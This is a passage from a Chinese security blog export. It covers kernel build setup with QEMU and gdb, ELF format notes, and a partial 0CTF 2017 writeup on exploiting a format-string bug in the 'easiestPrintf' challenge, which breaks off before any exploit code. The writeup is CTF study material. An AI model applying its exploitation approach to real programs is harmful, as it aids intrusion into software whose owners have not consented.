class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install libncurses5-dev</span><br><span class="line">$ sudo apt-get install qemu qemu-system</span><br><span class="line">$ make menuconfig</span><br></pre></td></tr></table></figure><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ make</span><br><span class="line">$ make all</span><br><span class="line">$ make modules</span><br></pre></td></tr></table></figure><p>编译这个地方，可能会出现几个错误~</p><h3 id="报错-以及解决办法"><a href="#报错-以及解决办法" class="headerlink" title="报错 以及解决办法"></a>报错 以及解决办法</h3><h4 id="编译出现的问题"><a href="#编译出现的问题" class="headerlink" title="编译出现的问题"></a>编译出现的问题</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">错误：</span><br><span class="line">rch/x86/kernel/ptrace.c:<span class="number">1472</span>:<span class="number">17</span>: error: conflicting types <span class="keyword">for</span> ‘syscall_trace_enter’</span><br><span class="line"> <span class="function">asmregparm <span class="keyword">long</span> <span class="title">syscall_trace_enter</span><span class="params">(struct pt_regs *regs)</span></span></span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/vm86.h:<span class="number">130</span>:<span class="number">0</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/processor.h:<span class="number">10</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/thread_info.h:<span class="number">22</span>,</span><br><span class="line">                 from include/linux/thread_info.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/preempt.h:<span class="number">9</span>,</span><br><span class="line">                 from include/linux/spinlock.h:<span class="number">50</span>,</span><br><span class="line">                 from include/linux/seqlock.h:<span class="number">29</span>,</span><br><span class="line">                 from include/linux/time.h:<span class="number">8</span>,</span><br><span class="line">                 from include/linux/timex.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/sched.h:<span class="number">56</span>,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:<span class="number">11</span>:</span><br><span class="line">/home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/ptrace.h:<span class="number">145</span>:<span class="number">13</span>: note: previous declaration of ‘syscall_trace_enter’ was here</span><br><span class="line"> <span class="function"><span class="keyword">extern</span> <span class="keyword">long</span> <span class="title">syscall_trace_enter</span><span class="params">(struct pt_regs *)</span></span>;</span><br><span class="line">             ^</span><br><span class="line">arch/x86/kernel/ptrace.c:<span class="number">1517</span>:<span class="number">17</span>: error: conflicting types <span class="keyword">for</span> ‘syscall_trace_leave’</span><br><span class="line"> <span class="function">asmregparm <span class="keyword">void</span> <span class="title">syscall_trace_leave</span><span class="params">(struct pt_regs *regs)</span></span></span><br><span class="line">                 ^</span><br><span class="line">In file included from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/vm86.h:<span class="number">130</span>:<span class="number">0</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/processor.h:<span class="number">10</span>,</span><br><span class="line">                 from /home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/thread_info.h:<span class="number">22</span>,</span><br><span class="line">                 from include/linux/thread_info.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/preempt.h:<span class="number">9</span>,</span><br><span class="line">                 from include/linux/spinlock.h:<span class="number">50</span>,</span><br><span class="line">                 from include/linux/seqlock.h:<span class="number">29</span>,</span><br><span class="line">                 from include/linux/time.h:<span class="number">8</span>,</span><br><span class="line">                 from include/linux/timex.h:<span class="number">56</span>,</span><br><span class="line">                 from include/linux/sched.h:<span class="number">56</span>,</span><br><span class="line">                 from arch/x86/kernel/ptrace.c:<span class="number">11</span>:</span><br><span class="line">/home/joker/linux_kernel/linux<span class="number">-2.6</span><span class="number">.32</span><span class="number">.1</span>/arch/x86/include/<span class="keyword">asm</span>/ptrace.h:<span class="number">146</span>:<span class="number">13</span>: note: previous declaration of ‘syscall_trace_leave’ was here</span><br><span class="line"> <span class="function"><span class="keyword">extern</span> <span class="keyword">void</span> <span class="title">syscall_trace_leave</span><span class="params">(struct pt_regs *)</span></span>;</span><br><span class="line">             ^</span><br><span class="line">make[<span class="number">2</span>]: *** [arch/x86/kernel/ptrace.o] 错误 <span class="number">1</span></span><br><span class="line">make[<span class="number">1</span>]: *** [arch/x86/kernel] 错误 <span class="number">2</span></span><br><span class="line">make: *** [arch/x86] 错误 <span class="number">2</span></span><br></pre></td></tr></table></figure><p>解决方案：<br><strong>两处修改：</strong><br><code>/linux-kernel/linux-2.6.32.1/arch/x86/include/asm$ vim ptrace.h</code><br><a href="http://i2.muimg.com/567571/6500043e055b4e05.png" class="gallery-item"><img src="http://i2.muimg.com/567571/6500043e055b4e05.png"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;linux&#x2F;init.h&gt;</span><br><span class="line">+#include &lt;linux&#x2F;linkage.h&gt;</span><br><span class="line"> </span><br><span class="line"> struct cpuinfo_x86;</span><br><span class="line"> struct task_struct;</span><br><span class="line">@@ -142,8 +143,8 @@ </span><br><span class="line">  int error_code, int si_code);</span><br><span class="line"> void signal_fault(struct pt_regs *regs, void __user *frame, char *where);</span><br><span class="line"> </span><br><span class="line">-extern long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">-extern void syscall_trace_leave(struct pt_regs *);</span><br><span class="line">+extern asmregparm long syscall_trace_enter(struct pt_regs *);</span><br><span class="line">+extern asmregparm void syscall_trace_leave(struct pt_regs *);</span><br></pre></td></tr></table></figure><h4 id="gcc-error-elf-i386-没有那个文件或目录"><a href="#gcc-error-elf-i386-没有那个文件或目录" class="headerlink" title="gcc: error: elf_i386: 没有那个文件或目录"></a>gcc: error: elf_i386: 没有那个文件或目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">错误:</span><br><span class="line">gcc: error: elf_i386: 没有那个文件或目录</span><br><span class="line">gcc: error: unrecognized command line option ‘-m’ </span><br></pre></td></tr></table></figure><p><strong>解决方案：</strong><br><code>beswing@swing:~/linux-kernel/linux-2.6.32.1$ vim arch/x86/vdso/Makefile</code><br><a href="http://i1.piimg.com/567571/67130a87d6f0cc69.png" class="gallery-item"><img src="http://i1.piimg.com/567571/67130a87d6f0cc69.png"></a><br>两处修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#VDSO_LDFLAGS_vdso.lds = -m elf_x86_64 -Wl,-soname=linux-vdso.so<span class="number">.1</span> \</span><br><span class="line">                        -Wl,-z,max-page-size=<span class="number">4096</span> -Wl,-z,common-page-size=<span class="number">4096</span></span><br><span class="line">VDSO_LDFLAGS_vdso.lds = -m64 -Wl,-soname=linux-vdso.so<span class="number">.1</span> \</span><br><span class="line">                        -Wl,-z,max-page-size=<span class="number">4096</span> -Wl,-z,common-page-size=<span class="number">4096</span></span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># VDSO_LDFLAGS_vdso32.lds = -m elf_i386 -Wl,-soname=linux-gate.so<span class="number">.1</span></span><br><span class="line">VDSO_LDFLAGS_vdso32.lds = -m32 -Wl,-soname=linux-gate.so<span class="number">.1</span></span><br></pre></td></tr></table></figure><h4 id="drivers-net-igbvf-igbvf-h-128-15-error-duplicate-member-‘page’"><a href="#drivers-net-igbvf-igbvf-h-128-15-error-duplicate-member-‘page’" class="headerlink" title="drivers/net/igbvf/igbvf.h:128:15: error: duplicate member ‘page’"></a>drivers/net/igbvf/igbvf.h:128:15: error: duplicate member ‘page’</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">错误:</span><br><span class="line">drivers&#x2F;net&#x2F;igbvf&#x2F;igbvf.h:128:15: error: duplicate member ‘page’</span><br><span class="line">  struct page *page;</span><br><span class="line">               ^</span><br><span class="line">make[3]: *** [drivers&#x2F;net&#x2F;igbvf&#x2F;ethtool.o] 错误 1</span><br><span class="line">make[2]: *** [drivers&#x2F;net&#x2F;igbvf] 错误 2</span><br><span class="line">make[1]: *** [drivers&#x2F;net] 错误 2</span><br><span class="line">make: *** [drivers] 错误 2 </span><br></pre></td></tr></table></figure><p>修改名字重复即可，路径在<code>beswing@swing:~/linux-kernel/linux-2.6.32.1$ vim ./drivers/net/igbvf/igbvf.h</code><br><a href="http://i1.piimg.com/567571/d34539954f6c015b.png" class="gallery-item"><img src="http://i1.piimg.com/567571/d34539954f6c015b.png"></a></p><h2 id="创建文件系统"><a href="#创建文件系统" class="headerlink" title="创建文件系统"></a>创建文件系统</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/linux-kernel/linux-2.6.32.1/linux-2.6.32.1/arch/i386/boot</span><br><span class="line">$ mkinitramfs -o initrd.img-2.6.23.1</span><br></pre></td></tr></table></figure><h2 id="使用qemu运行编译好的内核"><a href="#使用qemu运行编译好的内核" class="headerlink" title="使用qemu运行编译好的内核"></a>使用qemu运行编译好的内核</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -initrd arch/i386/boot/initrd.img-2.6.32.1  -m 512M</span><br></pre></td></tr></table></figure><h2 id="使用qemu运行内核-使用qemu官网提供的文件系统"><a href="#使用qemu运行内核-使用qemu官网提供的文件系统" class="headerlink" title="使用qemu运行内核(使用qemu官网提供的文件系统)"></a>使用qemu运行内核(使用qemu官网提供的文件系统)</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ wget http://wiki.qemu.org/download/linux-0.2.img.bz2 -O linux-0.2.img.bz2</span><br><span class="line">$ bunzip2 -d linux-0.2.img.bz2</span><br><span class="line">$ qemu-system-i386 -kernel arch/i386/boot/bzImage -hda linux-0.2.img -append <span class="string">&quot;root=/dev/sda&quot;</span></span><br></pre></td></tr></table></figure><h2 id="gdb调试内核"><a href="#gdb调试内核" class="headerlink" title="gdb调试内核"></a>gdb调试内核</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-i386 -S -kernel arch/i386/boot/bzImage -hda linux-0.2.img -append <span class="string">&quot;root=/dev/sda&quot;</span></span><br><span class="line">$ Ctrl+Alt+2即切换到QEMU工作台下</span><br><span class="line">$ Ctrl+Alt+G切换出QEMU工作台</span><br><span class="line">qemu $ gdbserver tcp::1234</span><br><span class="line">$ gdb vmlinux</span><br><span class="line">gdb $ target remote localhost:1234</span><br><span class="line">$ c</span><br></pre></td></tr></table></figure><p>​    </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> 环境配置 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux-kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《程序员的自我修养》读书笔记---ELF文件结构</title>
      <link href="a-programmer-prepares-about-elf.html"/>
      <url>a-programmer-prepares-about-elf.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h4><p><code>readelf -h </code> 查看ELF文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/桌面/0ctf/Print$ readelf -h ./EasiestPrintf</span><br><span class="line">ELF 头：</span><br><span class="line">  Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 </span><br><span class="line">  类别:                              ELF32</span><br><span class="line">  数据:                              2 补码，小端序 (little endian)</span><br><span class="line">  版本:                              1 (current)</span><br><span class="line">  OS/ABI:                            UNIX - System V</span><br><span class="line">  ABI 版本:                          0</span><br><span class="line">  类型:                              EXEC (可执行文件)</span><br><span class="line">  系统架构:                          Intel 80386</span><br><span class="line">  版本:                              0x1</span><br><span class="line">  入口点地址：               0x8048610</span><br><span class="line">  程序头起点：          52 (bytes into file)</span><br><span class="line">  Start of section headers:          6588 (bytes into file)</span><br><span class="line">  标志：             0x0</span><br><span class="line">  本头的大小：       52 (字节)</span><br><span class="line">  程序头大小：       32 (字节)</span><br><span class="line">  Number of program headers:         9</span><br><span class="line">  节头大小：         40 (字节)</span><br><span class="line">  节头数量：         29</span><br><span class="line">  字符串表索引节头： 26</span><br></pre></td></tr></table></figure><p>可能是由于是中文版的，直接给我翻译了。<br>ELF 文件头中，有ELF 魔数（Magic）、文件机器字节长度，数据存储方式，版本，运行平台，ABI版本,ELF重定位类型，等等等，中文很明显都能看出来了。</p><p>ELF 文件头 相关常数定义在“/usr/include/elf.h”,ELF 文件有32版本 和64位版本，文件头内容一样，有些成员不一样。两者文件分别叫”Elf_32Ehdr”和“Elf64_Ehdr”.</p><p>书上，以 32位的版本的文件头结构”Elf32_Ehdr”作为例子来描述。定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EI_NIDENT</span></span><br><span class="line">    <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> e_ident[EI_NIDENT];</span><br><span class="line">    Elf32_Half e_type;</span><br><span class="line">    Elf32_Half e_machine;</span><br><span class="line">    Elf32_Word e_version;</span><br><span class="line">    Elf32_Addr e_entry;</span><br><span class="line">    Elf32_Off e_phoff;</span><br><span class="line">    Elf32_Off e_shoff;</span><br><span class="line">    Elf32_Word e_flags;</span><br><span class="line">    Elf32_Half e_ehsize;</span><br><span class="line">    Elf32_Half e_phentsize;</span><br><span class="line">    Elf32_Half e_phnum;</span><br><span class="line">    Elf32_Half e_shentsize;</span><br><span class="line">    Elf32_Half e_shnum;</span><br><span class="line">    Elf32_Half e_shstrndx;</span><br><span class="line">    &#125;Elf32_Ehdr;</span><br></pre></td></tr></table></figure><p>发现，文件头结构与之前<code>readefl -h</code> 输出的文件头的结构可以说是一一对应的。</p><p>书中尤其提到了的是，Elf32_Ehdr中的e_ident的这个成员对应了结果的“class”，“Data”，“Version”、“OS/ABI”和”API Version”5个参数。</p><p>在文章中的文件头结构成员含义中，作者特别单独介绍了魔数，<br><strong>ELF 魔数</strong><br>Magic 的16个字节，对应的Elf_Ehdr的这个成员。这16个字节被ELF标准规定用来标识ELF文件的平台属性。</p><p><code> Magic：   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00</code></p><p>最开始的4个字节，0x7f 0x45 0x4c 0x46 第一个字节对应ASCII字符里的DEL控制符，后3个对应ELF 3个字母的ASCII码。所以这四个字节又称为ELF文件的魔数。</p><hr><p>很多类型的文件，其起始的几个字节的内容是固定的（或是有意填充，或是本就如此）。根据这几个字节的内容就可以确定文件类型，因此这几个字节的内容被称为魔数 (magic number)。此外在一些程序代码中，程序员常常将在代码中出现但没有解释的数字常量或字符串称为魔数 (magic number)或魔字符串。</p><hr><p>紧接着第一个字节用来标识ELF 文件类的，0x01表示32位，0x02表示64位的，第6个字节是字节序。规定ELF文件是大端还是小端</p><hr><p>大端模式，是指数据的高字节保存在内存的低地址中，而数据的低字节保存在内存的高地址中，这样的存储模式有点儿类似于把数据当作字符串顺序处理：地址由小向大增加，而数据从高位往低位放；这和我们的阅读习惯一致。<br>小端模式，是指数据的高字节保存在内存的高地址中，而数据的低字节保存在内存的低地址中，这种存储模式将地址的高低和数据位权有效地结合起来，高地址部分权值高，低地址部分权值低。</p><hr><p>第7个字节规定ELF文件的主版本号，一般是1（ELF 标准目前更新到1.2），后面的9个字节一般为0.</p><h4 id="段表"><a href="#段表" class="headerlink" title="段表"></a>段表</h4><p>段表(Section Header Table)，保存ELF文件段的基本属性。描述ELF文件各个段的信息：段名、段的长度、在文件中的偏移、读写权限以及段的其他属性。ELF文件的段结构由段表决定，段表由ELF文件头的“e_shoff” 成员决定。</p><hr><p>我们可以用<code>objdump -h</code>来查看 ELF 包含的段，但是这个命令知识显示关键段</p><hr><p>书中，告诉我们<code>readefl</code>工具能完整的显示段表结构“”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~&#x2F;桌面&#x2F;0ctf&#x2F;Print$ readelf -S EasiestPrintf</span><br><span class="line">共有 29 个节头，从偏移量 0x19bc 开始：</span><br><span class="line">节头：</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 0000ac 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          08048258 000258 000140 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          08048398 000398 0000ca 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          08048462 000462 000028 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         0804848c 00048c 000040 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080484cc 0004cc 000090 08   A  5   0  4</span><br><span class="line">  [10] .init             PROGBITS        0804855c 00055c 000023 00  AX  0   0  4</span><br><span class="line">  [11] .plt              PROGBITS        08048580 000580 000010 04  AX  0   0 16</span><br><span class="line">  [12] .plt.got          PROGBITS        08048590 000590 000078 00  AX  0   0  8</span><br><span class="line">  [13] .text             PROGBITS        08048610 000610 000392 00  AX  0   0 16</span><br><span class="line">  [14] .fini             PROGBITS        080489a4 0009a4 000014 00  AX  0   0  4</span><br><span class="line">  [15] .rodata           PROGBITS        080489b8 0009b8 000044 00   A  0   0  4</span><br><span class="line">  [16] .eh_frame_hdr     PROGBITS        080489fc 0009fc 00003c 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame         PROGBITS        08048a38 000a38 000108 00   A  0   0  4</span><br><span class="line">  [18] .init_array       INIT_ARRAY      08049ecc 000ecc 000004 00  WA  0   0  4</span><br><span class="line">  [19] .fini_array       FINI_ARRAY      08049ed0 000ed0 000004 00  WA  0   0  4</span><br><span class="line">  [20] .jcr              PROGBITS        08049ed4 000ed4 000004 00  WA  0   0  4</span><br><span class="line">  [21] .dynamic          DYNAMIC         08049ed8 000ed8 0000e0 08  WA  6   0  4</span><br><span class="line">  [22] .got              PROGBITS        08049fb8 000fb8 000048 04  WA  0   0  4</span><br><span class="line">  [23] .data             PROGBITS        0804a000 001000 000008 00  WA  0   0  4</span><br><span class="line">  [24] .bss              NOBITS          0804a020 001008 00002c 00  WA  0   0 32</span><br><span class="line">  [25] .comment          PROGBITS        00000000 001008 000034 01  MS  0   0  1</span><br><span class="line">  [26] .shstrtab         STRTAB          00000000 0018bc 0000fd 00      0   0  1</span><br><span class="line">  [27] .symtab           SYMTAB          00000000 00103c 000540 10     28  47  4</span><br><span class="line">  [28] .strtab           STRTAB          00000000 00157c 000340 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我的这个文件有29个段，Type描述了段的类型。书中告诉我们，段表是以“Elf32_Shdr”结构体为元素的数组。<br>#####　段的类型（sh_type）<br>段的类型常量，以<code>SHT_</code>开头。</p><h5 id="段的标志位"><a href="#段的标志位" class="headerlink" title="段的标志位"></a>段的标志位</h5><p>段的标志位表示段在进程虚拟地址空间中的属性，比如是否可写，是否可执行等。相关常量以<code>SHF_</code>开头</p><h5 id="段的链接信息-sh-link-、sh-info"><a href="#段的链接信息-sh-link-、sh-info" class="headerlink" title="段的链接信息(sh_link 、sh_info)"></a>段的链接信息(sh_link 、sh_info)</h5><p>段的类型与链接相关，如重定位表，符号表，这两个成员就有意义。</p><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Reading </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELF </tag>
            
            <tag> 程序员的自我修养 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2017年 0CTF---部分Pwn writeup</title>
      <link href="2017-0CTF-Pwn.html"/>
      <url>2017-0CTF-Pwn.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="easiestPrintf"><a href="#easiestPrintf" class="headerlink" title="easiestPrintf"></a>easiestPrintf</h4><p>这个题目让我想起了 之前做过的 <a href="http://bestwing.me/2016/12/30/one-gadget-rce/">oneshoot</a>。<br>先说下题目保护是全开的。然后我们开始分析下程序。<br><a href="http://i2.muimg.com/567571/df0a2c2d9c76df32.png" class="gallery-item"><img src="http://i2.muimg.com/567571/df0a2c2d9c76df32.png"></a></p><p>printf 后面直接跟了exit，由于保护全开，我们不能去修改  返回地址或者exit的got表。</p><p>在libc我们仔细看来printf函数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">printf</span><span class="params">(<span class="keyword">int</span> a1, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  va_list va; <span class="comment">// [sp+24h] [bp+8h]@1</span></span><br><span class="line"></span><br><span class="line">  va_start(va, a1);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">vfprintf</span>((<span class="keyword">int</span>)<span class="built_in">stdout</span>, a1, (<span class="keyword">int</span>)va);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上图是一个任意地址泄漏。<br><a href="http://i1.piimg.com/567571/5a6f350e07eb6d9d.png" class="gallery-item"><img src="http://i1.piimg.com/567571/5a6f350e07eb6d9d.png"></a><br>这里有一个很明显的漏洞–格式化串漏洞</p><figure class="highlight as"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">08048811</span> ; ---------------------------------------------------------------------------</span><br><span class="line">.text:<span class="number">08048811</span></span><br><span class="line">.text:<span class="number">08048811</span> loc_8048811:                            ; CODE XREF: leave+<span class="number">89</span>j</span><br><span class="line">.text:<span class="number">08048811</span>                 nop</span><br><span class="line">.text:<span class="number">08048812</span></span><br><span class="line">.text:<span class="number">08048812</span> loc_8048812:                            ; CODE XREF: leave+<span class="number">9</span>Ej</span><br><span class="line">.text:<span class="number">08048812</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048815</span>                 lea     eax, [ebp+s]</span><br><span class="line">.text:<span class="number">0804881</span>B                 push    eax             ; format</span><br><span class="line">.text:<span class="number">0804881</span>C                 call    printf</span><br><span class="line">.text:<span class="number">08048821</span>                 add     esp, <span class="number">10</span>h</span><br><span class="line">.text:<span class="number">08048824</span>                 sub     esp, <span class="number">0</span>Ch</span><br><span class="line">.text:<span class="number">08048827</span>                 push    <span class="number">0</span>               ; status</span><br><span class="line">.text:<span class="number">08048829</span>                 call    _exit</span><br><span class="line">.text:<span class="number">08048829</span> leave           endp</span><br><span class="line">.text:<span class="number">08048829</span></span><br></pre></td></tr></table></figure><p>仔细观察，我们发现printf，实质上是调用了<code>vfprintf((int)stdout, a1, (int)va)</code>,<br><a href="http://i2.muimg.com/567571/3b86753cbe700314.png" class="gallery-item"><img src="http://i2.muimg.com/567571/3b86753cbe700314.png"></a><br>如果 dword_1AC768和func_hook + 4 * char_size) 这两个位置的存储的数据为0，那么会进入到正常的流程，那么我就可以从libc中控制流程。</p><p>之后做的时候，发现别人特别好的一个方法，那就是</p><hr><p>不需要自己%x这样来计算测试偏移值，直接用pwntools中的fmtstr_payload来生成</p><hr><p><a href="http://i4.buimg.com/567571/21e45ef15617a1cb.png" class="gallery-item"><img src="http://i4.buimg.com/567571/21e45ef15617a1cb.png"></a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 